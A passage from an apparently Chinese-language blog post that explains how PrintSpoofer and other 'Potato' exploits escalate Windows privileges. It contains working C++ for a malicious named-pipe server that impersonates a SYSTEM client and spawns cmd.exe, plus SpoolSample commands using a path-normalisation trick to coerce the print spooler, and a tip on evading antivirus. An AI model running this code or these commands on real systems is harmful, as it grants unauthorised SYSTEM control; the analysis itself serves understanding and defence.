    &lt;span class=&quot;n&quot;&gt;DuplicateTokenEx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hToken&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TOKEN_ALL_ACCESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SecurityImpersonation&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TokenPrimary&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hSystemTokenDup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;CreateProcessWithTokenW&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hSystemTokenDup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LOGON_WITH_PROFILE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;L&quot;cmd.exe&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dwCreationFlags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lpEnvironment&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pwszCurrentDirectory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;si&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;wmain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;wchar_t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;LPWSTR&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pwszPipeName&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;TOKEN_GROUPS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;group_token&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;HANDLE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hPipe&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;INVALID_HANDLE_VALUE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;HANDLE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hToken&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;INVALID_HANDLE_VALUE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;SECURITY_DESCRIPTOR&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;SECURITY_ATTRIBUTES&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sa&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buffer_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;InitializeSecurityDescriptor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SECURITY_DESCRIPTOR_REVISION&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ConvertStringSecurityDescriptorToSecurityDescriptorW&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;L&quot;D:(A;OICI;GA;;;WD)&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sa&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lpSecurityDescriptor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;hPipe&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CreateNamedPipe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pwszPipeName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PIPE_ACCESS_DUPLEX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PIPE_TYPE_BYTE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PIPE_WAIT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2048&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2048&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sa&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;wprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;L&quot;[*] Named pipe &apos;%ls&apos; listening...&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pwszPipeName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ConnectNamedPipe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hPipe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;  
    &lt;span class=&quot;n&quot;&gt;wprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;L&quot;[+] A client connected!&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;ImpersonateNamedPipeClient&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hPipe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;OpenThreadToken&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GetCurrentThread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TOKEN_ALL_ACCESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FALSE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hToken&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ImpersonatedUser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hToken&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;CloseHandle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hPipe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;代码运行演示如下，说说实现思路&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/seim.gif&quot; alt=&quot;seim&quot; style=&quot;zoom:67%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;这里我们用Administrator账户（具有SeImpersonatePrivilege特权）的shell终端运行自己编写的”恶意“命名管道服务端，让具有System权限的命名管道客户端向我们创建的服务端写入数据，成功运用命名管道客户端模拟以达到Token令牌窃取的效果。关键代码：&lt;/p&gt;

&lt;div class=&quot;language-c++ highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;ImpersonateNamedPipeClient&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hPipe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;OpenThreadToken&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GetCurrentThread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TOKEN_ALL_ACCESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FALSE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hToken&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;ImpersonatedUser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hToken&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;大致可以理解为，ImpersonateNamedPipeClient(hPipe); 运行后，当前进程的Token令牌被替换为命名管道客户端的Token令牌，客户端又具有System权限，所有当前进程模拟后也具有了System权限，接着再调用OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &amp;amp;hToken);获取当前进程的Token令牌的句柄，并把Token令牌的句柄传给我们自己写的函数ImpersonatedUser(hToken)，达到Token令牌滥用的目的。&lt;/p&gt;

&lt;p&gt;现在目光回到Potatoes家族，命名管道在当代土豆中扮演了怎样的角色，可以说了解了命名管道客户端模拟就是了解了当代土豆的一半，剩下一半是什么？&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;就是如何让具有System权限的管道客户端进程访问我们创建的恶意命名管道服务端&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;这里以经典的PrintSpoofer土豆为例，它大致可以分成两个部分：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;让具有SeImpersonatePrivilege特权的账户创建恶意命名管道服务端&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;&lt;a href=&quot;https://github.com/leechristensen/SpoolSample&quot;&gt;SpoolSample&lt;/a&gt;&lt;/strong&gt; 结合Server Names路径规范解析特点，欺骗Spoolsv.exe进程（具有System权限）访问服务端，ImpersonateNamedPipeClient()替换线程令牌获得System权限&lt;/li&gt;
&lt;/ol&gt;

&lt;h1 id=&quot;printspoofer-原理探究&quot;&gt;PrintSpoofer 原理探究&lt;/h1&gt;

&lt;p&gt;PrintSpoofer的实现借鉴了&lt;a href=&quot;https://github.com/leechristensen/SpoolSample&quot;&gt;leechristensen/SpoolSample&lt;/a&gt;和一个Server Names路径解析的技巧。&lt;/p&gt;

&lt;p&gt;SpoolSample又被叫做打印机欺骗，自然离不开Windows的Spoolsc.exe打印机后台服务进程&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/image-20230720170152601.png&quot; alt=&quot;image-20230720170152601&quot; style=&quot;zoom:80%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Spoolsv.exe&lt;/strong&gt;进程负责将用户提交的打印任务添加到打印队列中，并将其发送给相应的打印机进行处理。它还负责监控打印队列的状态，处理打印错误和通知用户打印任务的完成情况。Spoolsv.exe进程通常在Windows系统启动时自动运行，并在后台持续运行，确保打印机系统的正常工作。&lt;/p&gt;

&lt;p&gt;并且它运行具有System权限&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/image-20230720171423961.png&quot; alt=&quot;image-20230720171423961&quot; style=&quot;zoom:80%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;SpoolSample作者的解释是，SpoolSample通常被用于强制 Windows 主机通过MS-RPRN（打印机协议） RPC 接口向其他计算机进行身份验证，初衷是运用于Windows域内进行利用。分析它的原理：&lt;/p&gt;

&lt;p&gt;Windows的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MS-RPRN&lt;/code&gt;协议用于打印客户端和打印服务器之间的通信，默认情况下打印服务是启用的。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/image-20230716233710224.png&quot; alt=&quot;image-20230716233710224&quot; style=&quot;zoom:80%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;SpoolSample的关键是Windows API中的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RpcRemoteFindFirstPrinterChangeNotificationEx()&lt;/code&gt;函数，它可以创建一个远程更改通知对象，该对象监视对打印机对象的更改，并使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RpcRouterReplyPrinter&lt;/code&gt; 或 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RpcRouterReplyPrinterEx&lt;/code&gt; 将更改通知发送到打印客户端。并且就是通过命名管道实现进程之间的通信。&lt;/p&gt;

&lt;p&gt;其函数原型，&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; DWORD RpcRemoteFindFirstPrinterChangeNotificationEx(
   [in] PRINTER_HANDLE hPrinter,
   [in] DWORD fdwFlags,
   [in] DWORD fdwOptions,
   [in, string, unique] wchar_t* pszLocalMachine,
   [in] DWORD dwPrinterLocal,
   [in, unique] RPC_V2_NOTIFY_OPTIONS* pOptions
 );
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;打印机后台程序处理服务的RPC接口本就通过命名管道公开，用pipelist查看，pipename管道名就是spoolss。本机的打印机管道路径&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;\\.\pipe\spools&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;/img/image-20230720204255874.png&quot; alt=&quot;image-20230720204255874&quot; style=&quot;zoom:80%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;到这我们可能理所应当的想到printspoofer的原理，利用SpoolSample强制Windows主机上的spoolss管道客户端向我们的恶意管道服务端发起连接，利用Windows API ImpersonateNamedPipeClient()模拟客户端的Access Token进行权限提升至System权限，这么说并不准确&lt;/p&gt;

&lt;p&gt;我们不妨看看spoolsample的利用，下面的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TARGET&lt;/code&gt;和&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CAPTURESERVER&lt;/code&gt;最后都会被填补成UNC路径&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SpoolSample.exe TARGET CAPTURESERVER
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;用Process Monitor记录进程读写，如下图，期间打印机Spoolsv.exe进程向管道 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\\192.168.110.137\pipe\spools&lt;/code&gt; 尝试读写，但是结果是&lt;strong&gt;ACCESS_DENIED&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/image-20230720221609510.png&quot; alt=&quot;image-20230720221609510&quot; style=&quot;zoom:70%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;肯定有朋友想到构造如下的的payload，其中 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\\192.168.110.137\pipe\demo&lt;/code&gt; 是我们创建的恶意管道服务端&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;.\SpoolSample.exe 192.168.110.1 192.168.110.137\pipe\demo
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;理想的预期是在进程读写里看见Spoolsv.exe进程向我们构造的恶意管道 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\\192.168.110.137\pipe\demo&lt;/code&gt; 写入数据，然后直接模拟，进而提权&lt;/p&gt;

&lt;p&gt;很可惜，尝试失败，spoolsv.exe进程对Server name做了校验，最后还是会替换成 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\\192.168.110.137\pipe\spools&lt;/code&gt; 管道。并且我们也无法创建和spools的同名恶意管道，因为它已经存在。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/image-20230720221937228.png&quot; alt=&quot;image-20230720221937228&quot; style=&quot;zoom:70%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;回看函数原型如下：&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;RpcRemoteFindFirstPrinterChangeNotificationEx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PRINTER_HANDLE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hPrinter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fdwFlags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fdwOptions&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;unique&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;wchar_t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pszLocalMachine&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dwPrinterLocal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;unique&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RPC_V2_NOTIFY_OPTIONS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pOptions&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;关键在 &lt;strong&gt;pszLocalMachine：指向表示客户端计算机名称的字符串的指针。&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;img/image-20230721013512436.png&quot; alt=&quot;image-20230721013512436&quot; /&gt;&lt;/p&gt;

&lt;p&gt;原因也是这里做了校验，会重置指定的命名管道&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/image-20230721013524643.png&quot; alt=&quot;image-20230721013524643&quot; style=&quot;zoom:80%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;这里PrintSpoofer的作者是用了个Server Names路径规范化解析的技巧&lt;/p&gt;

&lt;p&gt;如果主机名包含&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/&lt;/code&gt;，它将通过路径检验，但是在计算要连接的命名管道的路径时，规范化会将其转换为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\&lt;/code&gt;，例如&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;.\SpoolSample.exe 192.168.110.1 192.168.110.137/test
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/img/image-20230721015758154.png&quot; alt=&quot;image-20230721015758154&quot; style=&quot;zoom:80%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;可以看见，连接的管道已经变成了&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;\\192.168.110.137\test\pipe\spoolss
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;我们只需要根据命名管道的名称规范构造管道，举个例子&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;\\192.168.110.137\pipe\demo\pipe\spoolss
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这里分成两部分理解&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\\192.168.110.137\pipe&lt;/code&gt; 到这是正常命名&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\demo\pipe\spoolss&lt;/code&gt; 才是我们的管道名，因为打印机进程总会把\pipe\spoolss添加在路径后面&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;所以用上面的命名管道客户端模拟的代码，结合SpoolSample实现提权，演示一下&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/seimw.gif&quot; alt=&quot;seimw&quot; style=&quot;zoom:67%;&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;\\192.168.110.137/pipe/demo
通过命名检查后变成了
\\192.168.110.137\pipe\demo
最后在加上\pipe\spoolss，最终连接的命名管道就是
\\192.168.110.137\pipe\demo\pipe\spoolss
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这也是我们需要创建的恶意命名管道服务端。PrintSpoofer的实现原理也就是这些，回看其源码&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/image-20230721021921577.png&quot; alt=&quot;image-20230721021921577&quot; style=&quot;zoom:80%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;观察其函数头文件中的函数声明，结构结合原理一目了然&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;VOID PrintUsage(); 功能提示（做免杀防特征最好直接删了）&lt;/li&gt;
  &lt;li&gt;DWORD DoMain(); 主函数&lt;/li&gt;
